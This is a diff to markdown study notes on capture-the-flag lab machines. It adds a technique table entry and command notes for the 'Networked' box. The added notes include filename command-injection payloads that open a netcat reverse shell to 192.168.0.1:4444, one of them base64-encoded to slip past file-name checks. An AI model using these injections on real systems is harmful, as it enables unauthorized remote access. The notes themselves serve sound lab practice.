@@ -22,7 +22,7 @@
 | Magic | [SQLi](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/) bypassing login & <br> File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass) | mysqldump & Unknown SUID binary sysinfo |
 | *Mango |  certificate subdomains & <br> [enumerate](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration) credentials of nosql-injection <br> (*Not sure if you can use this script in the exam), reuse | jjs, write root SSH public key | 
 | Mirai | nmap, pi.hole, ssh | sudo list, mount, strings |
-| Networked | File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass) ||
+| Networked | File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass), php code injection | *sudo list |
 
 ### Additional command notes
 
@@ -76,4 +76,16 @@ Used in ```Mirai```
 ```
 # check partition
 strings /dev/sdb
+```
+
+Used in ```Networked```
+
+code injection
+
+```
+# method1: vaild file name
+echo "" > "; nc -c bash 192.168.0.1 4444 ;"
+# method2: use base64 encoding format to avoid file name checking
+echo nc -e /bin/bash 192.168.0.1 4444 | base64 -w0
+echo "" > "a; echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMC4xIDQ0NDQK | base64 -d | sh; b"
 ```
